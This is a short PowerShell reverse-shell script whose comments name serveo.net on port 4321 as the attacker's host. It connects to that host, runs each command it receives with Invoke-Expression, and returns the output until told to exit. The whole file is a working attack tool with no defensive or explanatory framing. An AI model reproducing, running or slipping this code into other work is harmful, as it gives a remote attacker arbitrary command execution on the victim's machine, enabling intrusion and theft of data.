# Define the attacker's hostname and port number
$hostname = "serveo.net"
$port = 4321

# Create a TCP connection
$client = New-Object System.Net.Sockets.TcpClient($hostname, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send function
function Send-Data($data) {
    $writer.WriteLine($data)
    $writer.Flush()
}

# Receive function
function Receive-Data {
    return $reader.ReadLine()
}

# Main loop
while ($true) {
    try {
        $command = Receive-Data
        if ($command -eq 'exit') { break }
        $output = Invoke-Expression $command 2>&1
        Send-Data($output)
    } catch {
        Send-Data($_.Exception.Message)
    }
}

# Close connection
$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
